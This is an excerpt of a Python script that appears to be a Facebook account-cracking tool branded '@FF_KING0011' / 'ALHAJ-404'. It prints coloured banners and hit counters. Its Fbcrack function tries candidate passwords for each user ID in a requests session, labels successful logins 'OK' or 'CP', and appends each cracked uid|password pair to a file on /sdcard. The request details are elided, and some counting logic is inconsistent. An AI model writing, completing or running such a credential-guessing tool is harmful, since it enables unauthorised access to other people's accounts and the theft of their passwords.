...
sys.stdout.write('\x1b[1;35m\x1b]2; 彡ᎪᏞᎻᎪᎫ-404_ᏦᏆΝᏀヅ \x07')
A0="\033[1;30m"
A1="\033[1;31m"
A2="\033[1;32m"
A3="\033[1;33m"
...
def Alhaj_404():
	...
	print(f"{A1}║{Tik} @FF_KING0011 ᎪᏞϴᏔᎬՏ ҒᏆᎡᎬ ")
	print(f'{A1}║{Tik} ͲϴͲᎪᏞ ϴᏦ ᏆᎠ : '+str(len(ok)))
	print(f'{A1}║{Tik} ͲϴͲᎪᏞ ᏟᏢ ᏆᎠ : '+str(len(cp)))
	print(f"{A1}║{Tik} @FF_KING0011 ͲᎬᎡᎷႮХ ᎪᏞᏞ ҒᎡᎬᎬ ᏟϴᎷᎷᎪΝᎠ")
	print(f"{A1}║{Tik} @FF_KING0011 ᎪᎠᎷᏆΝ ᏴᎽ @FF_KING")
	print(f"{A1}╚══════════════════════════════════════╝");exit()
...
def Fbcrack(uid,pas,tl):
	...
	sys.stdout.write(f'\r {A1}[{Clorhx}FF-KING{A1}]{Emoj}[{A6}%s{A1}]{Emj}[{A2}ϴᏦ-%s{A1}]{Emojx}[{A2}ᏟᏢ-%s{A1}]\r'%(loop,len(ok),len(cp)))
	sys.stdout.flush()
	try:
		for ps in pas:
			with requests.Session() as session:
				...
				if "www.facebook.com" in str(po):
					print(f'{A6}[{A2}@FF_KING0011-{A1}OK{A6}]{A2} {uid} {A6}◉{A2} {ps}')
					open("/sdcard/ALHAJ-404_OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n")
					cp.append(uid)
					break
				elif "access_token" in po:
					print(f'{A6}[{A2}@FF_KING0011-CP{A6}]{A2} {uid} {A6}◉{A2} {ps}')
